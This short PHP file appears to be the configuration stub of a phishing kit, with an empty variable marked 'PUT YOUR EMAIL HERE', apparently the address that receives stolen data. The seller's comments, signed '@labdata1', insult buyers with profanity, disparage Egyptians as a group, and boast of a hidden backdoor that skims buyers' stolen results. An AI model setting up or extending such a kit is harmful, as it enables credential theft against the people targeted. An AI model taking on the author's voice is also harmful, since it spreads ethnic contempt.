<?php
// dont share page will fuk the code but you will stil do beacase all egypt stupid. I will batch all your work dumb fuckers
// @labdata1 if you didnt buy from me i hide batch so buy my code and dont share i will cash all your work LOL LOL.


###########################################################################################################
$send = "";         # <------ PUT YOUR EMAIL HERE #LABDATA   @labdata1
 ###########################################################################################################